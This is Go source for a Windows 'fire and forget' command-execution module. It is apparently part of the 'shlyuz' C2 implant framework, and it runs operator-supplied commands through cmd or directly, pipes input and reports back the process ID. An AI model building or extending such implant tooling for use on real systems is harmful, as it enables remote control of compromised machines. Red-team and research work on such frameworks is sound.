//go:build windows,implant && (!lp || !teamserver)

package fireforget

import (
	"bufio"
	"errors" // For errors.New
	"io"
	"log"
	"os/exec"
	"shlyuz/pkg/component"
	"strings" 
	"syscall"
)

func ExecuteCmd(cmdDetails component.Command, execChannels *component.ComponentExecutionChannel, inPipe io.Reader) error {
	log.Printf("CmdID %s (Windows): Preparing to fire and forget command: %s, Type: %s", cmdDetails.Id, cmdDetails.Args, cmdDetails.Type)

	var command *exec.Cmd
	var displayCmdLine string 

	if cmdDetails.Type == "Shell" {
		command = exec.Command("cmd")
		displayCmdLine = "cmd /C " + cmdDetails.Args
		command.SysProcAttr = &syscall.SysProcAttr{
			CmdLine: displayCmdLine,
			// HideWindow: true, 
		}
		log.Printf("CmdID %s (Windows): Using Shell execution for fire and forget. CmdLine: %s", cmdDetails.Id, displayCmdLine)
	} else { 
		parts := strings.Split(cmdDetails.Args, " ")
		if len(parts) == 0 || parts[0] == "" { // Check if parts[0] is empty
			errMsg := "Args string is empty or invalid for direct fire and forget execution."
			log.Printf("CmdID %s (Windows): Error: %s", cmdDetails.Id, errMsg)
			if execChannels != nil && execChannels.StdErr != nil {
				select {
				case execChannels.StdErr <- "Error: " + errMsg: // Send prefixed error
				default: log.Printf("CmdID %s (Windows): StdErr channel full.", cmdDetails.Id)
				}
			}
			return errors.New(errMsg) 
		}
		executable := parts[0]
		var args []string
		if len(parts) > 1 {
			args = parts[1:]
		}
		command = exec.Command(executable, args...)
		displayCmdLine = cmdDetails.Args // For logging, use the original args string
		log.Printf("CmdID %s (Windows): Using Direct execution for fire and forget. Command: %s, Args: %v", cmdDetails.Id, executable, args)
	}

	if inPipe != nil {
		stdin, err := command.StdinPipe()
		if err != nil {
			errMsg := "Error creating StdinPipe"
			log.Printf("CmdID %s (Windows): %s: %v. CmdLine for logs: %s", cmdDetails.Id, errMsg, err, displayCmdLine)
			if execChannels != nil && execChannels.StdErr != nil {
				select {
				case execChannels.StdErr <- errMsg + ": " + err.Error():
				default: log.Printf("CmdID %s (Windows): StdErr channel full.", cmdDetails.Id)
				}
			}
			return err
		}
		go func() {
			defer stdin.Close()
			log.Printf("CmdID %s (Windows): Piping input to command. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
			if _, errCopy := io.Copy(stdin, inPipe); errCopy != nil {
				log.Printf("CmdID %s (Windows): Error writing to stdin pipe: %v. CmdLine for logs: %s", cmdDetails.Id, errCopy, displayCmdLine)
			}
			log.Printf("CmdID %s (Windows): Finished piping input. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
		}()
	}

	cmdOutReader, err := command.StdoutPipe()
	if err != nil {
		errMsg := "Error creating StdoutPipe for draining"
		log.Printf("CmdID %s (Windows): %s: %v. CmdLine for logs: %s", cmdDetails.Id, errMsg, err, displayCmdLine)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Windows): StdErr channel full.", cmdDetails.Id)
			}
		}
		return err
	}
	outScanner := bufio.NewScanner(cmdOutReader)
	go func() {
		log.Printf("CmdID %s (Windows): Goroutine started for draining stdout. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
		for outScanner.Scan() {
			log.Printf("CmdID %s (Windows stdout): %s", cmdDetails.Id, outScanner.Text())
		}
		if errScan := outScanner.Err(); errScan != nil {
			log.Printf("CmdID %s (Windows): Error draining stdout: %v. CmdLine for logs: %s", cmdDetails.Id, errScan, displayCmdLine)
		}
		log.Printf("CmdID %s (Windows): Goroutine finished draining stdout. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
	}()

	cmdErrReader, err := command.StderrPipe()
	if err != nil {
		errMsg := "Error creating StderrPipe for draining"
		log.Printf("CmdID %s (Windows): %s: %v. CmdLine for logs: %s", cmdDetails.Id, errMsg, err, displayCmdLine)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Windows): StdErr channel full.", cmdDetails.Id)
			}
		}
		return err
	}
	errScanner := bufio.NewScanner(cmdErrReader)
	go func() {
		log.Printf("CmdID %s (Windows): Goroutine started for draining stderr. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
		for errScanner.Scan() {
			log.Printf("CmdID %s (Windows stderr): %s", cmdDetails.Id, errScanner.Text())
		}
		if errScan := errScanner.Err(); errScan != nil {
			log.Printf("CmdID %s (Windows): Error draining stderr: %v. CmdLine for logs: %s", cmdDetails.Id, errScan, displayCmdLine)
		}
		log.Printf("CmdID %s (Windows): Goroutine finished draining stderr. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
	}()

	if err := command.Start(); err != nil {
		errMsg := "Error starting command"
		log.Printf("CmdID %s (Windows): %s. CmdLine for logs: '%s', Error: %v", cmdDetails.Id, errMsg, displayCmdLine, err)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Windows): StdErr channel full.", cmdDetails.Id)
			}
		}
		return err
	}

	log.Printf("CmdID %s (Windows): Command started successfully in background (PID: %d). CmdLine for logs: %s", cmdDetails.Id, command.Process.Pid, displayCmdLine)

	if execChannels != nil && execChannels.Pid != nil {
		select {
		case execChannels.Pid <- command.Process.Pid:
		default: log.Printf("CmdID %s (Windows): Pid channel full, dropping PID.", cmdDetails.Id)
		}
	}
	return nil 
}
